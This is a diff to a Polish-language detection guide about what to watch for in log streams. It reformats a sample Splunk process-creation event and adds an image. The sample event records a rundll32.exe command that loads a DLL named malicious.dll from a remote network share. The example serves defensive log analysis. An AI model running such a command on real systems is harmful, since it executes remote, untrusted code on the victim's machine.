@@ -52,10 +52,14 @@ Na co patrzeć w strumieniu logów / JSONie:
   
 Przykładowy JSON z logu Splunka:
 
-```{
+```
   "EventCode": "4688",
   "ComputerName": "DESKTOP-UR3OJVV",
   "NewProcessName": "C:\\Windows\\System32\\rundll32.exe",
   "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
   "CommandLine": "rundll32.exe \\\\192.168.0.107\\share\\malicious.dll,EntryPoint"
-}```
+```
+
+<img width="1023" height="577" alt="3" src="https://github.com/user-attachments/assets/a9aaa6c5-3390-47aa-a0bc-061131d1a50d" />
+
+
